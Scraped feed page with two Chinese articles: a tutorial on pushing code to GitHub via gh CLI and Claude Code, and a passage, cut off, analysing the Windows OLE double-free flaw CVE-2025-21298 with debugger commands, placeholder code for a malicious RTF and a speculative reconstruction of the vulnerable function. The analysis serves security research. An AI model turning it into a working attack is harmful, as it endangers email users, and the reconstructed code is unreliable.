                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>一句话推送代码到 GitHub，一次配置永久使用。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">核心价值</h2>
<p><strong>传统方式</strong>：打开浏览器 → 登录 GitHub → 创建仓库 → 复制地址 → git remote add → git push</p>
<p><strong>现在只需要</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">你：帮我把这个项目推送到 GitHub
AI：好的，已完成。仓库地址：https:<span class="hljs-comment">//github.com/xxx/xxx</span>
</code></pre>
<p><strong>而且</strong>：第一次配置后，以后所有项目都不需要再认证，直接推送。</p>
<hr/>
<h2 data-id="heading-1">快速开始（3 分钟上手）</h2>
<h3 data-id="heading-2">第一步：安装工具</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装 GitHub CLI</span>
brew install gh

<span class="hljs-comment"># 安装 Claude Code</span>
npm install -g @anthropic-ai/claude-code
</code></pre>
<h3 data-id="heading-3">第二步：登录 GitHub（仅需一次）</h3>
<pre><code class="hljs language-bash" lang="bash">gh auth login
</code></pre>
<p>按提示在浏览器完成认证。<strong>这是唯一需要手动操作的步骤，而且只需要做一次。</strong></p>
<h3 data-id="heading-4">第三步：开始使用</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> your-project    <span class="hljs-comment"># 进入任意项目</span>
claude             <span class="hljs-comment"># 启动 AI 助手</span>
</code></pre>
<p>然后直接说：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"帮我把这个项目推送到 GitHub"</span>
</code></pre>
<p>完成。以后任何项目，重复第三步即可。</p>
<hr/>
<h2 data-id="heading-5">一次配置，永久使用</h2>
<p>这是本方案最大的优势，值得单独强调：</p>





























<table><thead><tr><th>场景</th><th>操作</th></tr></thead><tbody><tr><td>第一个项目</td><td>安装 gh CLI → 认证 → 推送</td></tr><tr><td>第二个项目</td><td>直接说"帮我推送到 GitHub"</td></tr><tr><td>第三个项目</td><td>直接说"帮我推送到 GitHub"</td></tr><tr><td>第 N 个项目</td><td>直接说"帮我推送到 GitHub"</td></tr><tr><td>重启电脑后</td><td>直接说"帮我推送到 GitHub"</td></tr></tbody></table>
<p><strong>原理</strong>：gh CLI 的认证信息存储在系统钥匙串中，全局生效，永久有效。</p>
<hr/>
<h2 data-id="heading-6">三种方式对比</h2>
<p>本文介绍三种操作 GitHub 的方式，<strong>推荐第二种</strong>：</p>





























<table><thead><tr><th>方式</th><th>操作方式</th><th>学习成本</th><th>推荐度</th></tr></thead><tbody><tr><td>GitHub CLI</td><td>手动敲命令</td><td>需要记命令</td><td>一般</td></tr><tr><td><strong>Claude Code + gh CLI</strong></td><td><strong>说人话</strong></td><td><strong>零成本</strong></td><td><strong>强烈推荐</strong></td></tr><tr><td>Claude Code + MCP</td><td>说人话</td><td>配置稍复杂</td><td>推荐</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-7">方式一：GitHub CLI（基础）</h2>
<p>GitHub CLI (gh) 是 GitHub 官方命令行工具。</p>
<h3 data-id="heading-8">安装与认证</h3>
<pre><code class="hljs language-bash" lang="bash">brew install gh      <span class="hljs-comment"># 安装</span>
gh auth login        <span class="hljs-comment"># 登录（按提示操作）</span>
</code></pre>
<h3 data-id="heading-9">核心命令</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建仓库并推送（最常用）</span>
gh repo create 仓库名 --public --<span class="hljs-built_in">source</span>=. --remote=github --push

<span class="hljs-comment"># 其他常用命令</span>
gh repo <span class="hljs-built_in">clone</span> owner/repo    <span class="hljs-comment"># 克隆仓库</span>
gh <span class="hljs-built_in">pr</span> create                <span class="hljs-comment"># 创建 PR</span>
gh issue list               <span class="hljs-comment"># 查看 Issue</span>
</code></pre>
<h3 data-id="heading-10">小结</h3>
<ul>
<li><strong>优点</strong>：官方工具，功能完整</li>
<li><strong>缺点</strong>：需要记住命令和参数</li>
</ul>
<hr/>
<h2 data-id="heading-11">方式二：Claude Code + gh CLI（推荐）</h2>
<p>不想记命令？让 AI 帮你执行。</p>
<h3 data-id="heading-12">什么是 Claude Code</h3>
<p>Anthropic 官方命令行 AI 助手：</p>
<ul>
<li>直接在终端与 AI 对话</li>
<li>AI 可以执行命令、读写文件、操作 Git</li>
<li>理解项目上下文</li>
</ul>
<h3 data-id="heading-13">安装</h3>
<pre><code class="hljs language-bash" lang="bash">npm install -g @anthropic-ai/claude-code
</code></pre>
<h3 data-id="heading-14">如何与 Claude 交流</h3>
<p><strong>直接说目标（推荐）</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"帮我把这个项目推送到 GitHub"</span>
</code></pre>
<p>Claude 会自动：检查 gh CLI → 检查认证 → 创建仓库 → 推送代码</p>
<p><strong>指定工具</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"用 gh cli 创建一个 GitHub 仓库并推送"</span>
</code></pre>
<p><strong>分步执行</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"帮我安装 GitHub CLI"</span>
<span class="hljs-string">"帮我登录 GitHub"</span>
<span class="hljs-string">"帮我创建仓库并推送"</span>
</code></pre>
<h3 data-id="heading-15">实际对话演示</h3>
<p>以下是本文的真实操作记录：</p>
<hr/>
<p><strong>我</strong>：帮我把项目推送到 GitHub</p>
<p><strong>Claude</strong>：让我先安装 gh CLI。</p>
<pre><code class="hljs language-bash" lang="bash">brew install gh
</code></pre>
<p><strong>Claude</strong>：请在浏览器打开 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flogin%2Fdevice" target="_blank" title="https://github.com/login/device" ref="nofollow noopener noreferrer">github.com/login/devic…</a> 输入验证码：<code>9F6D-76C8</code></p>
<p><strong>我</strong>：好了</p>
<p><strong>Claude</strong>：认证成功，正在创建仓库并推送。</p>
<pre><code class="hljs language-bash" lang="bash">gh repo create azhe_project --public --<span class="hljs-built_in">source</span>=. --remote=github --push
</code></pre>
<p><strong>Claude</strong>：完成！仓库地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F15811079534%2Fazhe_project" target="_blank" title="https://github.com/15811079534/azhe_project" ref="nofollow noopener noreferrer">github.com/15811079534…</a></p>
<hr/>
<h3 data-id="heading-16">更多场景</h3>
<pre><code class="hljs language-sql" lang="sql">"帮我提交代码"           → AI 自动 <span class="hljs-keyword">add</span>、生成 <span class="hljs-keyword">commit</span> message、<span class="hljs-keyword">commit</span>
"帮我创建 PR"            → AI 执行 gh pr <span class="hljs-keyword">create</span>
"帮我看看有哪些 Issue"    → AI 执行 gh issue list 并总结
"帮我回滚到上一个版本"    → AI 执行 git revert
</code></pre>
<h3 data-id="heading-17">小结</h3>
<ul>
<li><strong>优点</strong>：零记忆负担，说人话就行，一次配置永久使用</li>
<li><strong>缺点</strong>：需要 Claude Code 和 API 访问</li>
</ul>
<hr/>
<h2 data-id="heading-18">方式三：MCP（进阶）</h2>
<p>MCP (Model Context Protocol) 让 AI 直接调用 GitHub API，跳过命令行。</p>
<h3 data-id="heading-19">与 gh CLI 的区别</h3>
<pre><code class="hljs language-objectivec" lang="objectivec">gh <span class="hljs-built_in">CLI</span> 方式：AI → shell 命令 → gh <span class="hljs-built_in">CLI</span> → GitHub API
MCP 方式：  AI → MCP Server → GitHub API（更直接）
</code></pre>
<h3 data-id="heading-20">配置步骤</h3>
<p><strong>1. 创建 GitHub Token</strong></p>
<p>打开 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsettings%2Ftokens" target="_blank" title="https://github.com/settings/tokens" ref="nofollow noopener noreferrer">github.com/settings/to…</a> → Generate new token → 勾选 <code>repo</code> 权限</p>
<p><strong>2. 配置 Claude Code</strong></p>
<p>编辑 <code>~/.claude/settings.json</code>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"github"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"@modelcontextprotocol/server-github"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"env"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"GITHUB_PERSONAL_ACCESS_TOKEN"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ghp_你的token"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>3. 重启 Claude Code</strong></p>
<h3 data-id="heading-21">适用场景</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"帮我 fork 这个仓库"</span>
<span class="hljs-string">"帮我看看 owner/repo 的 README"</span>
<span class="hljs-string">"在 owner/repo 创建一个 Issue"</span>
</code></pre>
<h3 data-id="heading-22">小结</h3>
<ul>
<li><strong>优点</strong>：直接调用 API，速度快，适合批量操作</li>
<li><strong>缺点</strong>：不支持本地 Git 操作（push/pull），配置较复杂</li>
</ul>
<hr/>
<h2 data-id="heading-23">推荐方案</h2>

























<table><thead><tr><th>用户类型</th><th>推荐方式</th><th>理由</th></tr></thead><tbody><tr><td><strong>大多数开发者</strong></td><td>Claude Code + gh CLI</td><td>简单、完整、一次配置永久使用</td></tr><tr><td>喜欢命令行</td><td>纯 gh CLI</td><td>精确控制</td></tr><tr><td>批量远程操作</td><td>额外配置 MCP</td><td>速度更快</td></tr></tbody></table>
<p><strong>本文推荐</strong>：Claude Code + gh CLI，兼顾易用性和功能完整性。</p>
<hr/>
<h2 data-id="heading-24">总结</h2>
<p><strong>核心收益</strong>：</p>
<ol>
<li>一句话推送代码到 GitHub</li>
<li>一次配置，永久使用</li>
<li>不用记任何命令</li>
</ol>
<p><strong>行动步骤</strong>：</p>
<ol>
<li><code>brew install gh</code> - 安装 GitHub CLI</li>
<li><code>gh auth login</code> - 登录（仅此一次）</li>
<li><code>npm install -g @anthropic-ai/claude-code</code> - 安装 Claude Code</li>
<li>以后任何项目，直接说"帮我推送到 GitHub"</li>
</ol>
<p>就这么简单。</p>
<hr/>
<h2 data-id="heading-25">参考链接</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcli.github.com%2Fmanual%2F" target="_blank" title="https://cli.github.com/manual/" ref="nofollow noopener noreferrer">GitHub CLI 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fclaude-code" target="_blank" title="https://docs.anthropic.com/en/docs/claude-code" ref="nofollow noopener noreferrer">Claude Code 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmodelcontextprotocol.io%2F" target="_blank" title="https://modelcontextprotocol.io/" ref="nofollow noopener noreferrer">MCP 官方文档</a></li>
</ul>
<hr/>
<blockquote>
<p>作者：aZhe
如有问题欢迎留言交流</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析Windows OLE高危漏洞CVE-2025-21298：零点击远程代码执行]]></title>    <link>https://juejin.cn/post/7600764857770164274</link>    <guid>https://juejin.cn/post/7600764857770164274</guid>    <pubDate>2026-01-30T07:32:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600764857770164274" data-draft-id="7600764857770115122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析Windows OLE高危漏洞CVE-2025-21298：零点击远程代码执行"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-30T07:32:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析Windows OLE高危漏洞CVE-2025-21298：零点击远程代码执行
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T07:32:08.000Z" title="Fri Jan 30 2026 07:32:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CVE-2025-21298 – Microsoft Windows OLE零点击远程代码执行漏洞分析</h2>
<h3 data-id="heading-1">📌 项目概述</h3>
<p>本分析报告详细剖析了Microsoft Windows OLE组件中的一个严重安全漏洞CVE-2025-21298。该漏洞存在于<code>ole32.dll</code>库的<code>UtOlePresStmToContentsStm</code>函数中，是一个双重释放内存破坏漏洞。攻击者通过特制的RTF文件，可在受害者预览邮件时触发漏洞，实现零点击远程代码执行。</p>
<p><strong>关键信息：</strong></p>
<ul>
<li><strong>漏洞类型</strong>：双重释放内存破坏</li>
<li><strong>影响组件</strong>：Microsoft Windows OLE (Object Linking and Embedding) – 具体在<code>ole32.dll</code></li>
<li><strong>受影响函数</strong>：<code>UtOlePresStmToContentsStm</code></li>
<li><strong>严重等级</strong>：CVSS 3.1评分 <strong>9.8</strong> – 关键级</li>
<li><strong>攻击向量</strong>：特制RTF文件</li>
<li><strong>交互需求</strong>：零点击（预览时触发）</li>
<li><strong>主要目标</strong>：Outlook用户及其他支持OLE的应用程序（如Word）</li>
</ul>
<h3 data-id="heading-2">⚙️ 功能特性</h3>
<h4 data-id="heading-3">漏洞分析功能</h4>
<ul>
<li><strong>内存管理缺陷识别</strong>：分析Windows OLE组件在RTF文件处理时的内存管理错误</li>
<li><strong>双重释放路径追踪</strong>：详细追踪<code>pstmContents</code>指针在特定条件下的双重释放过程</li>
<li><strong>攻击向量还原</strong>：重构通过恶意RTF文件利用OLE结构的技术路径</li>
</ul>
<h4 data-id="heading-4">技术深度分析</h4>
<ul>
<li><strong>零点击漏洞机制</strong>：深入分析无需用户交互即可触发的漏洞执行机制</li>
<li><strong>邮件攻击场景</strong>：针对Outlook邮件预览场景的专项安全分析</li>
<li><strong>系统兼容性评估</strong>：覆盖从Windows 10到Windows Server 2025的广泛系统版本</li>
</ul>
<h4 data-id="heading-5">安全研究价值</h4>
<ul>
<li><strong>实战漏洞研究</strong>：真实世界中的高危害零点击漏洞分析案例</li>
<li><strong>补丁影响评估</strong>：分析微软2025年1月安全更新的修复效果</li>
<li><strong>企业级防护建议</strong>：提供多层次的缓解措施和防护策略</li>
</ul>
<h3 data-id="heading-6">💻 安装与运行</h3>
<h4 data-id="heading-7">环境要求</h4>
<ul>
<li><strong>操作系统</strong>：受影响版本的Windows系统（用于验证分析）</li>
<li><strong>分析工具</strong>：
<ul>
<li>IDA Pro或Ghidra（反汇编分析）</li>
<li>WinDbg或x64dbg（动态调试）</li>
<li>RTF文件分析工具</li>
</ul>
</li>
<li><strong>安全环境</strong>：建议在隔离的虚拟环境中进行分析</li>
</ul>
<h4 data-id="heading-8">配置说明</h4>
<ol>
<li>
<p><strong>获取受影响组件</strong>：</p>
<ul>
<li>从受影响Windows版本提取<code>ole32.dll</code>文件</li>
<li>确保获取正确版本以匹配漏洞存在条件</li>
</ul>
</li>
<li>
<p><strong>设置分析环境</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建隔离的测试环境</span>
<span class="hljs-comment"># 安装必要的调试和分析工具</span>
</code></pre>
</li>
<li>
<p><strong>准备测试用例</strong>：</p>
<ul>
<li>构造符合漏洞触发条件的RTF样本文件</li>
<li>配置Outlook或其他OLE应用作为测试目标</li>
</ul>
</li>
</ol>
<h3 data-id="heading-9">📖 使用说明</h3>
<h4 data-id="heading-10">漏洞复现步骤</h4>
<ol>
<li>
<p><strong>静态分析阶段</strong>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 使用反汇编工具分析ole32.dll</span>
<span class="hljs-comment"># 重点查看UtOlePresStmToContentsStm函数</span>
function_analysis = analyze_function(<span class="hljs-string">"UtOlePresStmToContentsStm"</span>)

<span class="hljs-comment"># 识别内存管理相关操作</span>
memory_operations = find_memory_management_patterns()

<span class="hljs-comment"># 标记潜在的释放操作点</span>
free_points = identify_free_operations()
</code></pre>
</li>
<li>
<p><strong>动态调试阶段</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 附加到目标进程（如Outlook）</span>
windbg -p &lt;outlook_pid&gt;

<span class="hljs-comment"># 设置断点在关键函数</span>
bp ole32!UtOlePresStmToContentsStm

<span class="hljs-comment"># 监控内存分配和释放</span>
!heap -<span class="hljs-built_in">stat</span>
</code></pre>
</li>
<li>
<p><strong>攻击向量构建</strong>：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 构建恶意RTF文件结构</span>
rtf_structure = {
    <span class="hljs-string">"ole_object"</span>: {
        <span class="hljs-string">"pres_stream"</span>: <span class="hljs-string">"malicious_data"</span>,
        <span class="hljs-string">"contents_stream"</span>: <span class="hljs-string">"exploit_payload"</span>
    },
    <span class="hljs-string">"trigger_conditions"</span>: <span class="hljs-string">"double_free_trigger"</span>
}

<span class="hljs-comment"># 嵌入到邮件中测试</span>
test_email = create_email_with_rtf_attachment(rtf_structure)
</code></pre>
</li>
</ol>
<h4 data-id="heading-11">典型应用场景</h4>
<ul>
<li><strong>安全研究人员</strong>：用于理解Windows OLE安全机制和漏洞模式</li>
<li><strong>企业安全团队</strong>：评估内部系统的漏洞风险和制定防护策略</li>
<li><strong>漏洞挖掘者</strong>：学习类似漏洞的发现和分析方法</li>
</ul>
<h3 data-id="heading-12">🔍 核心代码分析</h3>
<h4 data-id="heading-13">漏洞函数分析</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ole32.dll中的漏洞函数片段</span>
<span class="hljs-function">HRESULT <span class="hljs-title">UtOlePresStmToContentsStm</span><span class="hljs-params">(IStream *pstmPres, IStream **ppstmContents)</span>
</span>{
    HRESULT hr = S_OK;
    <span class="hljs-comment">// ... 初始化代码</span>
    
    <span class="hljs-comment">// 漏洞点：pstmContents的内存管理错误</span>
    <span class="hljs-keyword">if</span> (pstmPres != <span class="hljs-literal">NULL</span>)
    {
        <span class="hljs-comment">// 第一次内存分配或获取</span>
        *ppstmContents = <span class="hljs-built_in">allocate_or_get_stream</span>();
        
        <span class="hljs-comment">// 某些错误处理路径可能导致双重释放</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FAILED</span>(hr))
        {
            <span class="hljs-comment">// 错误处理：可能释放ppstmContents</span>
            <span class="hljs-keyword">if</span> (*ppstmContents != <span class="hljs-literal">NULL</span>)
            {
                <span class="hljs-comment">// 第一个释放点</span>
                (*ppstmContents)-&gt;<span class="hljs-built_in">Release</span>();
                *ppstmContents = <span class="hljs-literal">NULL</span>;
            }
        }
    }
    
    <span class="hljs-comment">// 后续代码中可能存在另一个释放操作</span>
    <span class="hljs-keyword">if</span> (some_condition)
    {
        <span class="hljs-comment">// 第二个释放点（漏洞触发）</span>
        <span class="hljs-keyword">if</span> (*ppstmContents != <span class="hljs-literal">NULL</span>)
        {
            (*ppstmContents)-&gt;<span class="hljs-built_in">Release</span>();  <span class="hljs-comment">// 双重释放发生！</span>
            *ppstmContents = <span class="hljs-literal">NULL</span>;
        }
    }
    
    <span class="hljs-keyword">return</span> hr;
}
</code></pre>
<h4 data-id="heading-14">RTF文件解析关键代码</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// RTF解析中的OLE对象处理</span>
